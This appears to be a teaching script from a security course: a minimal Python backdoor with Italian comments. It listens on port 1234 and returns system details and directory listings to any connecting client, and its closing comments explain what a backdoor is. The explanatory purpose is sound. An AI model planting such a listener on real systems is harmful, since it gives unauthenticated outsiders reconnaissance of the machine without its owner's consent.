import socket, platform, os  # Importa le librerie necessarie: socket per la comunicazione di rete, platform per ottenere informazioni sul sistema operativo, e os per interagire con il file system.

SRV_ADDR = ""  # Definisce l'indirizzo del server. Lasciato vuoto per ascoltare su tutte le interfacce di rete.
SRV_PORT = 1234  # Definisce la porta su cui il server ascolterà le connessioni.

# Creazione del socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un socket utilizzando l'indirizzo IPv4 (AF_INET) e il protocollo TCP (SOCK_STREAM).
s.bind((SRV_ADDR, SRV_PORT))  # Assegna l'indirizzo e la porta al socket creato.
s.listen(1)  # Configura il socket per ascoltare le connessioni in entrata. Il parametro 1 specifica il numero massimo di connessioni in attesa.
connection, address = s.accept()  # Il server accetta una connessione in entrata. Questa chiamata è bloccante, il che significa che il programma aspetta fino a quando un client si connette.
print("client connected: ", address)  # Stampa l'indirizzo del client che si è connesso.

# Loop di ricezione ed elaborazione dei dati
while 1:  # Inizia un loop infinito per gestire la comunicazione con il client.
    try:
        data = connection.recv(1024)  # Riceve dati dal client. La dimensione massima dei dati ricevuti in un'unica chiamata è di 1024 byte.
    except: 
        continue  # Se si verifica un errore durante la ricezione dei dati, il loop continua senza interrompersi.

    # Esecuzione dei comandi
    if(data.decode('utf-8') == '1'):  # Se il dato ricevuto è il carattere '1':
        tosend = platform.platform() + " " + platform.machine()  # Ottiene informazioni sul sistema operativo e sulla macchina.
        connection.sendall(tosend.encode())  # Invia queste informazioni al client.
    elif(data.decode('utf-8') == '2'):  # Se il dato ricevuto è il carattere '2':
        data = connection.recv(1024)  # Riceve un percorso di directory dal client.
        try:
            filelist = os.listdir(data.decode('utf-8'))  # Ottiene la lista dei file nella directory specificata.
            tosend = ""  # Inizializza una stringa vuota per accumulare i nomi dei file.
            for x in filelist:
                tosend += ";" + x  # Aggiunge ciascun nome di file alla stringa tosend, separato da un punto e virgola.
        except:
            tosend = "Wrong path"  # Se si verifica un errore durante la lettura della directory, imposta il messaggio di risposta a "Wrong path".
        connection.sendall(tosend.encode())  # Invia il contenuto della directory o il messaggio di errore al client.
    elif(data.decode('utf-8') == '0'):  # Se il dato ricevuto è il carattere '0':
        connection.close()  # Chiude la connessione con il client.
        connection, address = s.accept()  # Attende una nuova connessione.

# Questo codice è un esempio di backdoor che consente il controllo remoto di un sistema. 
# MA CHE COS'E UNA BACKDOOR?
# Una backdoor è un metodo per bypassare la normale autenticazione e ottenere accesso non autorizzato a un sistema informatico, un'applicazione o una rete. 
# Viene spesso installata da sviluppatori o amministratori per scopi legittimi, come la manutenzione o il recupero di dati, ma può anche essere inserita da cybercriminali per scopi malevoli.
#  Le backdoor consentono a un attaccante di accedere al sistema senza essere rilevato, spesso permettendo il controllo remoto del sistema e l'installazione di ulteriori software dannosi.